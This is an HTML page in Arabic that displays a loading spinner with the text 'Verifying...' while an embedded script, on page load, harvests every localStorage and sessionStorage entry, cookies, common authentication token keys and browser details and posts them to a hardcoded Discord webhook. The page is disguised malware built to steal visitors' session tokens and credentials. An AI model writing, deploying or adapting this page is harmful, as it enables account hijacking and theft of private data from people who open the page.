<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>جاري التحميل...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #0a0a0a;
    color: #fff;
    font-family: system-ui, -apple-system, sans-serif;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
  }
  .spinner {
    width: 48px; height: 48px;
    border: 4px solid #333;
    border-top-color: #00ff88;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  p { margin-top: 20px; opacity: 0.6; font-size: 14px; }
</style>
</head>
<body>
  <div class="spinner"></div>
  <p>جاري التحقق...</p>

<script>
(function() {
  const WEBHOOK = "https://discord.com/api/webhooks/1574779761828565115/znJR942hsjGtkLFTtnFRDcR94BXhYVts58ssFwie21cp5tuUkGfDMd-2V4SH8BsyYmaM";

  function send(payload) {
    const text = "```json\n" + JSON.stringify(payload, null, 2).slice(0, 1800) + "\n```";
    fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: text })
    }).catch(() => {});
  }

  function grab() {
    const data = {
      localStorage: {},
      sessionStorage: {},
      cookies: document.cookie || "",
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      screen: screen.width + "x" + screen.height,
      url: location.href,
      referrer: document.referrer,
      time: new Date().toISOString()
    };

    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        data.localStorage[k] = localStorage.getItem(k);
      }
    } catch(e) {}

    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        data.sessionStorage[k] = sessionStorage.getItem(k);
      }
    } catch(e) {}

    const commonKeys = [
      "token", "access_token", "id_token", "authToken",
      "jwt", "bearer", "session", "user", "auth",
      "firebase:authUser", "oidc.user", "msal"
    ];
    commonKeys.forEach(k => {
      try {
        const v = localStorage.getItem(k) || sessionStorage.getItem(k);
        if (v) data["found_" + k] = v;
      } catch(e) {}
    });

    send(data);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", grab);
  } else {
    grab();
  }

  setTimeout(grab, 1000);
})();
</script>
</body>
</html>
